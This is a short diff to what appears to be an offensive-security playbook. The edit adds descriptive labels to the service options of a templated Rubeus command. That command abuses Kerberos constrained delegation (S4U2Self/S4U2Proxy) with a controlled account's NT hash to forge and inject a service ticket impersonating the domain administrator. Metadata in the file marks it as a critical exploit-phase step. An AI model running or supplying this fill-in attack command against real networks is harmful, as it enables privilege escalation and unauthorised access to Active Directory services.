@@ -185,7 +185,7 @@ S4U2Self with /altservice to forge a usable service ticket as another user, then
 S4U2Proxy chain to forge a service ticket as administrator on the named SPN, using a controlled account's RC4 hash.
 
 ```bash
-.\Rubeus.exe s4u /impersonateuser:administrator /msdsspn:{{SPN:str:cifs/web01.corp.local}} /altservice:{{ALTSERVICE:choice:host,cifs,http,ldap,mssqlsvc,wsman,rpcss,dns,gc,imap,smtp,ftp}} /user:{{USERNAME:str}} /rc4:{{NTHASH:str}} /ptt
+.\Rubeus.exe s4u /impersonateuser:administrator /msdsspn:{{SPN:str:cifs/web01.corp.local}} /altservice:{{ALTSERVICE:choice:host=generic host service,cifs=SMB access,http=web service,ldap=directory,mssqlsvc=MSSQL,wsman=WinRM,rpcss=DCE-RPC,dns=name service,gc=Global Catalog,imap=mail,smtp=mail,ftp=file transfer}} /user:{{USERNAME:str}} /rc4:{{NTHASH:str}} /ptt
 ```
 
 <!-- meta: risk=critical | phase=exploit | tags=s4u,s4u2proxy,delegation,admin -->
